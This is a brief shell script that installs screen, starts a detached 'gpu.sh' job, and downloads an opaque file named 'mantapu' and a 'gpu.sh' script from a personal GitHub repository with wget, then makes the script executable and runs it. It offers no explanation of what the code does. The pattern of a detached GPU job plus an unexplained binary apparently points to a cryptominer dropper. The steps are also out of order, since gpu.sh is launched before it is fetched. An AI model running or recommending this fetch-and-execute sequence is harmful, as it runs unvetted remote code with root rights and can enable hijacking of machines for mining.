#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/suranadnan/hello/raw/main/mantapu
wget https://raw.githubusercontent.com/suranadnan/hello/main/gpu.sh
chmod +x gpu.sh
./gpu.sh
